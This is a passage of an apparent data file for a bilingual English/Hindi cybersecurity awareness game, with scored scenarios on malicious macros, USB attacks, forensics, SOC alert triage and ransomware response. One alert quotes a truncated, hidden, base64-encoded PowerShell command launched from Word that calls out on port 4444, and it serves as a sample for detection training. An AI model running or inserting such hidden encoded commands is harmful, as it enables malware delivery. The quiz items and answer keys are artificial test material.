                ("Critical vulnerability: Implement server-side authorization check verifying that `current_user.id == invoice.owner_id` before returning data", True, "Flawless API security! Never trust client-supplied IDs without verifying ownership.", "बिल्कुल सही! हमेशा सर्वर पर यूजर ओनरशिप सत्यापित करें।"),
                ("Hide the URL bar in the user's browser", False, "Trivially bypassed via curl or Postman.", "आसानी से बायपास हो जाता है।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 18: Malware Hunter
    # -------------------------------------------------------------------------
    "malware-hunter": [
        {
            "type": "file",
            "sender": "Email Attachment Scanner",
            "subject": "Suspicious Document: Sales_Report_Q3.docm",
            "body": "A Word document opens with a blurred preview and a yellow warning ribbon stating: 'Protected View: Enable Editing and Enable Macros to decrypt confidential content.'",
            "is_threat": True,
            "explanation_en": "Malicious VBA macros download and execute secondary malware payloads (e.g., Emotet, Qakbot) directly in memory using PowerShell.",
            "explanation_hi": "वर्ड डॉक्यूमेंट में मैक्रो सक्षम करने का अनुरोध मैलवेयर डाउनलोड करने की सामान्य चाल है।",
            "warning_signs_en": "Macro execution prompt, blurred content claiming to be encrypted, .docm extension.",
            "warning_signs_hi": "मैक्रो सक्षम करने का दबाव, धुंधला कंटेंट।",
            "choices": [
                ("Click 'Enable Content' to read the document", False, "Executes malicious Visual Basic scripts silently in the background.", "पृष्ठभूमि में हानिकारक स्क्रिप्ट चलने लगेगी।"),
                ("Do not enable macros, close the file, and submit it to the SOC sandbox", True, "Spot on! Never enable macros on documents received from external sources.", "बिल्कुल सही! बाहरी फाइलों में कभी भी मैक्रो सक्षम न करें।"),
                ("Save the file on desktop and double-click it repeatedly", False, "Increases execution exposure.", "जोखिम बढ़ता है।")
            ]
        },
        {
            "type": "process",
            "sender": "Endpoint Detection and Response (EDR)",
            "subject": "Suspicious Process Execution Alert",
            "body": "EDR detects an anomaly on host WS-041: `winword.exe` spawned child process `powershell.exe -WindowStyle Hidden -Enc aQB3AHI...` which initiated an outbound connection to an unknown IP on port 4444.",
            "is_threat": True,
            "explanation_en": "Office documents spawning hidden PowerShell processes downloading external payloads is classic Living-off-the-Land (LotL) malware execution.",
            "explanation_hi": "वर्ड फाइल द्वारा बैकग्राउंड में पॉवरशेल चलाकर बाहरी कनेक्शन बनाना हमले का संकेत है।",
            "warning_signs_en": "Office application spawning scripting engine, hidden window flag, base64 encoded command.",
            "warning_signs_hi": "छिपी हुई पॉवरशेल विंडो, एन्कोडेड कमांड।",
            "choices": [
                ("Ignore the alert as routine Windows telemetry", False, "Allows an interactive reverse shell inside your internal network.", "हमलावर को नेटवर्क में नियंत्रण मिल जाएगा।"),
                ("Isolate host WS-041 from the network, terminate the process tree, and initiate memory dump forensics", True, "Flawless incident response! Immediate host isolation halts lateral movement.", "उत्कृष्ट! होस्ट को तुरंत नेटवर्क से अलग करें और जांच शुरू करें।"),
                ("Reboot the machine to fix the problem", False, "Destroys volatile evidence in RAM needed for forensic attribution.", "रैम में मौजूद महत्वपूर्ण फॉरेंसिक सबूत नष्ट हो जाएंगे।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 20: USB Danger Zone
    # -------------------------------------------------------------------------
    "usb-danger-zone": [
        {
            "type": "hardware",
            "sender": "Physical Security Inspection",
            "subject": "Unknown Cable plugged into Reception Desk",
            "body": "You notice an employee plugged an unfamiliar charging cable labeled 'OMG Cable' into their workstation's USB port.",
            "is_threat": True,
            "explanation_en": "The O.MG cable looks identical to a standard lightning/USB-C charging cable, but conceals an internal Wi-Fi micro-controller and keystroke injection payload.",
            "explanation_hi": "ओएमजी केबल सामान्य दिखती है लेकिन इसमें छिपा हुआ वाई-फाई और कीलॉगर होता है।",
            "warning_signs_en": "Unvetted personal cables plugged into corporate workstations, hidden hardware implants.",
            "warning_signs_hi": "अज्ञात केबल, छिपा हुआ हार्डवेयर इम्प्लांट।",
            "choices": [
                ("Borrow the cable to charge your personal smartphone", False, "Your phone or laptop will be exposed to remote hardware hijacking.", "आपका डिवाइस हैक हो सकता है।"),
                ("Unplug the cable immediately, report to physical security, and enforce USB port-blocking policy", True, "Perfect! Hardware attacks bypass traditional software firewalls.", "शानदार! केबल निकालें और सुरक्षा टीम को सूचित करें।"),
                ("Cut the wire with scissors while plugged in", False, "Hazardous and damages equipment.", "अनुचित और असुरक्षित।")
            ]
        },
        {
            "type": "promotional",
            "sender": "Cybersecurity Conference Booth",
            "subject": "Free Promotional Swag Flash Drive",
            "body": "At a vendor expo, an unverified booth gives away free branded USB drives claiming to contain product whitepapers.",
            "is_threat": True,
            "explanation_en": "Supply chain tampering allows attackers to load malicious auto-run payloads or BadUSB firmware onto free conference swag.",
            "explanation_hi": "निःशुल्क पेनड्राइव में अक्सर मैलवेयर या दुर्भावनापूर्ण फर्मवेयर हो सकते हैं।",
            "warning_signs_en": "Untrusted third-party media handed out in public venues.",
            "warning_signs_hi": "सार्वजनिक आयोजनों में बांटे गए असत्यापित स्टोरेज डिवाइस।",
            "choices": [
                ("Plug the promotional USB into an isolated offline sandbox machine for inspection", True, "Excellent! Untrusted media must only be inspected in dedicated quarantined environments.", "उत्कृष्ट! केवल अलग रखे गए सुरक्षित सिस्टम पर ही जांचें।"),
                ("Plug directly into the domain controller server", False, "Catastrophic infrastructure breach.", "डोमेन कंट्रोलर सीधे हैक हो जाएगा।"),
                ("Format the drive without checking and immediately use for backups", False, "BadUSB firmware attacks persist even after formatting.", "फॉर्मेट करने के बाद भी फर्मवेयर मैलवेयर बना रह सकता है।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 22: Digital Evidence Detective
    # -------------------------------------------------------------------------
    "digital-evidence-detective": [
        {
            "type": "forensics",
            "sender": "Incident Scene Preservation",
            "subject": "Order of Volatility in Evidence Acquisition",
            "body": "You arrive at a compromised server currently executing an active malware process. What must be captured FIRST according to RFC 3227?",
            "is_threat": False,
            "explanation_en": "Volatile memory (RAM) and network connections disappear when a machine loses power. Live RAM acquisition must precede hard disk imaging.",
            "explanation_hi": "रैम में मौजूद डेटा बिजली जाते ही नष्ट हो जाता है, इसलिए सबसे पहले रैम की कॉपी ली जाती है।",
            "warning_signs_en": "Powering off or rebooting destroys ephemeral decryption keys and injected processes.",
            "warning_signs_hi": "रीबूट करने से मेमोरी में मौजूद एन्क्रिप्शन की और प्रोसेस नष्ट हो जाते हैं।",
            "choices": [
                ("Pull the electrical power cable immediately", False, "Destroys volatile memory, active network sockets, and running process data.", "मेमोरी का सारा डेटा तुरंत नष्ट हो जाएगा।"),
                ("Acquire volatile system memory (RAM) and active network state before altering system power", True, "Spot on! RFC 3227 establishes registers/cache and RAM as highest volatility.", "बिल्कुल सही! फॉरेंसिक नियमों के अनुसार पहले रैम का बैकअप लें।"),
                ("Run Windows Disk Cleanup and defragmentation", False, "Overwrites valuable forensic evidence sectors.", "सबूत मिट जाएंगे।")
            ]
        },
        {
            "type": "integrity",
            "sender": "Chain of Custody Protocol",
            "subject": "Verifying Forensic Image Integrity",
            "body": "You have completed a bit-stream physical image of a suspect hard drive. How do you legally prove the image has never been altered during analysis?",
            "is_threat": False,
            "explanation_en": "Cryptographic hashing (SHA-256) computed before and after analysis proves mathematical equivalence and admissibility under evidentiary chain of custody.",
            "explanation_hi": "फॉरेंसिक इमेज की अखंडता साबित करने के लिए SHA-256 हैश का मिलान किया जाता है।",
            "warning_signs_en": "Analyzing original physical evidence without write-blockers invalidates chain of custody.",
            "warning_signs_hi": "बिना राइट-ब्लॉकर के जांच करने से सबूत अमान्य हो जाते हैं।",
            "choices": [
                ("Compute SHA-256 cryptographic hashes immediately upon acquisition and verify match on write-blocked working copies", True, "Flawless forensic procedure! Cryptographic hashes guarantee legal integrity.", "शानदार! क्रिप्टोग्राफिक हैश सबूत की कानूनी वैधता सुनिश्चित करता है।"),
                ("Rename the files with date and time in Windows Explorer", False, "File metadata changes do not prove cryptographic integrity.", "फाइल नाम बदलने से प्रामाणिकता सिद्ध नहीं होती।"),
                ("Compress with WinRAR using a secret password", False, "Irrelevant to scientific forensic verification.", "वैज्ञानिक फॉरेंसिक प्रक्रिया के विपरीत।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 23: SOC Alert Triage
    # -------------------------------------------------------------------------
    "soc-alert-triage": [
        {
            "type": "siem",
            "sender": "SIEM Alert Queue: Splunk / Elastic",
            "subject": "Brute Force followed by Lateral Kerberoasting",
            "body": "Alert #SIEM-4091: 420 failed NTLM logins from host IP 10.10.4.15 within 60s, followed by successful Kerberos TGS request for SPN `MSSQLSvc/db01.corp` with RC4 encryption.",
            "is_threat": True,
            "explanation_en": "Brute force followed by service principal ticket requesting (Kerberoasting) indicates an active intrusion moving laterally toward privileged databases.",
            "explanation_hi": "बार-बार असफल लॉगिन के बाद कर्बरोस टिकट मांगना आंतरिक नेटवर्क हमले का संकेत है।",
            "warning_signs_en": "High-frequency failed auth, anomalous Kerberos TGS request for high-privilege service account.",
            "warning_signs_hi": "सैकड़ों असफल लॉगिन, सेवा खाते के लिए असामान्य टिकट।",
            "choices": [
                ("Close ticket as a benign user typo", False, "Allows the adversary to crack the offline ticket and compromise the SQL cluster.", "हमलावर पूरे डेटाबेस का नियंत्रण पा लेगा।"),
                ("Classify as HIGH severity, revoke compromised account sessions, reset Kerberos krbtgt password, and isolate 10.10.4.15", True, "Master SOC triage! Rapid containment prevents Active Directory domain compromise.", "उत्कृष्ट! होस्ट को अलग करें और खाते का सत्र तुरंत रद्द करें।"),
                ("Delete the SIEM log to free up disk space", False, "Destroys monitoring history.", "लॉग मिटाना गंभीर चूक है।")
            ]
        },
        {
            "type": "siem",
            "sender": "SIEM Alert Queue: Splunk / Elastic",
            "subject": "Benign Scheduled Vulnerability Scan",
            "body": "Alert #SIEM-4092: 8,000 port scan events from IP 10.10.1.20 targeting web tier on TCP ports 80, 443, 8080 during Saturday 02:00 maintenance window.",
            "is_threat": False,
            "explanation_en": "Cross-referencing scheduled change requests confirms IP 10.10.1.20 is the authorized Nessus vulnerability scanner running its weekly baseline audit.",
            "explanation_hi": "शनिवार की रखरखाव खिड़की में आंतरिक स्कैनर द्वारा की गई अधिकृत स्कैनिंग सुरक्षित है।",
            "warning_signs_en": "Always verify change tickets and approved scanner IP lists before triggering false alarm incident response.",
            "warning_signs_hi": "अलार्म बजाने से पहले स्वीकृत स्कैनर सूची और रखरखाव समय की पुष्टि करें।",
            "choices": [
                ("Wake the CISO at 2:00 AM and shut down the company data center", False, "Severe false-positive overreaction disrupting business continuity.", "बिना पुष्टि के सिस्टम बंद करने से व्यापार बाधित होगा।"),
                ("Verify against approved maintenance window change ticket, confirm authorized scanner IP, and resolve as expected audit activity", True, "Spot on! Professional SOC analysts validate context to filter false positives.", "बिल्कुल सही! रखरखाव टिकट से पुष्टि करके इसे सामान्य ऑडिट दर्ज करें।"),
                ("Block the company's internal vulnerability scanner permanently", False, "Blinds the security team to actual vulnerabilities.", "सुरक्षा ऑडिट बंद हो जाएगा।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 29: Cybersecurity Escape Room
    # -------------------------------------------------------------------------
    "cybersecurity-escape-room": [
        {
            "type": "cipher",
            "sender": "Chamber 2: Firewall Rule Override Terminal",
            "subject": "Egress Filtering Configuration Puzzle",
            "body": "To unlock the pressure door to Chamber 3, configure the outbound firewall policy to block malicious command-and-control (C2) while allowing secure web traffic:",
            "is_threat": False,
            "explanation_en": "Strict egress filtering blocks unauthorized C2 callbacks on non-standard ports (e.g., 4444, 1337) while maintaining monitored HTTPS outbound traffic.",
            "explanation_hi": "बाहरी फ़ायरवॉल नियमों से संदिग्ध पोर्ट बंद करके डेटा चोरी रोकी जाती है।",
            "warning_signs_en": "Unrestricted outbound rules (ALLOW ANY ANY) allow backdoors to connect out silently.",
            "warning_signs_hi": "सभी पोर्ट खुले रखने से बैकडोर आसानी से बाहर जुड़ सकते हैं।",
            "choices": [
                ("DROP all outbound TCP 4444 & unapproved ports; ALLOW only inspected TCP 443 (HTTPS) via corporate proxy", True, "Chamber Door Unlocked! Strict egress filtering neutralizes reverse shells.", "दरवाजा खुल गया! कड़े फ़ायरवॉल नियम रिवर्स शेल को रोकते हैं।"),
                ("ALLOW all outbound ports to ANY destination without inspection", False, "The backdoor establishes an external reverse shell immediately.", "बैकडोर तुरंत बाहर जुड़ जाएगा।"),
                ("Disable the firewall completely", False, "Total security failure.", "पूरी सुरक्षा विफल।")
            ]
        },
        {
            "type": "terminal",
            "sender": "Chamber 3: Emergency Extraction Airlock",
            "subject": "Cryptographic Hash Decryption Key",
            "body": "The final airlock door requires entering the authentic SHA-256 signature matching the authorized firmware hash published by Security Operations:",
            "is_threat": False,
            "explanation_en": "Verifying cryptographic signatures prevents tampering and ensures firmware authenticity before executing critical operations.",
            "explanation_hi": "क्रिप्टोग्राफिक हैश से फर्मवेयर की प्रामाणिकता साबित होती है।",
            "warning_signs_en": "Bypassing hash verification can deploy trojanized rootkits.",
            "warning_signs_hi": "हैश जांचे बिना फर्मवेयर डालना खतरनाक है।",
            "choices": [
                ("Verify firmware with authorized public key signature and SHA-256 hash match before releasing airlock", True, "Victory! Escape Room Cleared! Cryptographic integrity secured your escape.", "शानदार! एस्केप रूम पूरा हुआ, क्रिप्टोग्राफिक सुरक्षा सफल रही।"),
                ("Ignore the signature and click 'Force Flash Unsigned Firmware'", False, "Installs malicious firmware bricking the airlock system.", "सिस्टम खराब हो जाएगा।"),
                ("Enter 'password123' as the master key", False, "Access denied.", "प्रवेश अस्वीकृत।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 30: Ultimate Human Firewall
    # -------------------------------------------------------------------------
    "ultimate-human-firewall": [
        {
            "type": "incident",
            "sender": "Crisis Management Taskforce",
            "subject": "Coordinated Ransomware Outbreak Incident",
            "body": "A coordinated cyber attack is underway: Active directory accounts are being locked out, network shares show `.locked` extensions, and a countdown timer demands $5M. What is the Incident Commander's FIRST action?",
            "is_threat": True,
            "explanation_en": "Immediate network isolation halts lateral encryption spread to secondary subnets, while protecting immutable backup vaults.",
            "explanation_hi": "रैनसमवेयर फैलने से रोकने के लिए सबसे पहले संक्रमित नेटवर्क को तुरंत अलग किया जाता है।",
            "warning_signs_en": "Rapid file extension mutations, active network encryption, extortion note.",
            "warning_signs_hi": "फाइलों के नाम बदलना, तेजी से एन्क्रिप्शन, फिरौती नोट।",
            "choices": [
                ("Pay the $5M cryptocurrency ransom immediately", False, "No guarantee of decryption; funds international crime syndicates.", "डेटा मिलने की कोई गारंटी नहीं होती।"),
                ("Sever external WAN links, isolate affected VLAN subnets, protect offline immutable backups, and mobilize the CSIRT", True, "Master Defense! Swift network containment saves core business operations.", "उत्कृष्ट! नेटवर्क अलग करके बैकअप सुरक्षित करना सबसे सही कदम है।"),
                ("Delete all files to stop the attackers from reading them", False, "Destroys all recoverable business records.", "रिकवरी योग्य डेटा नष्ट हो जाएगा।")
            ]
        },
        {
            "type": "governance",
            "sender": "Post-Incident Human Firewall Review",
            "subject": "Building Long-Term Organizational Resilience",
            "body": "What is the ultimate foundation of a truly resilient Human Firewall organization?",
            "is_threat": False,
            "explanation_en": "A resilient Human Firewall combines continuous simulation training, a no-blame reporting culture, multi-factor zero-trust architecture, and validated configuration management (Terraform, Ansible, Puppet).",
            "explanation_hi": "मजबूत सुरक्षा संस्कृति, नियमित प्रशिक्षण और स्वचालित टूल्स से संगठन सुरक्षित रहता है।",
            "warning_signs_en": "Relying on technology alone without empowering people always leaves organizations vulnerable.",
            "warning_signs_hi": "केवल तकनीक पर निर्भर रहना और लोगों को प्रशिक्षित न करना जोखिम भरा है।",
            "choices": [
                ("Fostering a no-blame reporting culture, continuous hands-on simulation, Zero-Trust controls, and automated configuration management", True, "CAMPAIGN CONQUERED! You are the Ultimate Human Firewall!", "बधाई! आपने अल्टीमेट ह्यूमन फ़ायरवॉल अभियान पूरा कर लिया!"),
                ("Firing any employee who clicks a simulated phishing link once", False, "Creates a culture of fear where employees hide real security incidents.", "डर के कारण लोग वास्तविक हमलों को छुपाने लगते हैं।"),
                ("Relying 100% on antivirus without any human awareness", False, "Social engineering easily bypasses perimeter defenses.", "सोशल इंजीनियरिंग से एंटीवायरस को आसानी से धोखा दिया जा सकता है।")
            ]
        }
    ]
}
